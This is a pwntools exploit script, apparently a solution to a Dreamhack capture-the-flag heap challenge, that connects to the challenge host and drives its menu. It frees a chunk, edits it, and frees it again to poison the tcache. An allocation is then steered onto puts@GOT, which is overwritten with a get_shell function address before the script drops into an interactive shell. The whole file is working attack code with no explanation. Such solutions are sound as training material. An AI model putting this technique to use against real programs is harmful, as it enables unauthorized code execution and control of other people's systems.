from pwn import *

def create(size, data):
    global p

    p.sendlineafter(b"> ", b'1')

    p.sendlineafter(b"Size: ", size)
    p.sendafter(b'Data: ', data)

def modify(index, size, data):
    global p

    p.sendlineafter(b"> ", b'2')

    p.sendlineafter(b"idx: ", index)
    p.sendlineafter(b"Size: ", size)
    p.sendafter(b'Data: ', data)

def delete(index):
    global p

    p.sendlineafter(b"> ", b'3')

    p.sendlineafter(b"idx: ", index)
    
get_shell_address = 0x0000000000401530
puts_got = 0x404038;

p = remote("host1.dreamhack.games", 12149)

create(b'32', b'test')
delete(b'0')
modify(b'0', b'16', b'\x00'*15)
delete(b'0')

create(b'32', p64(puts_got))
create(b'32', p64(puts_got))

pause()

create(b'64', p64(get_shell_address))

p.interactive()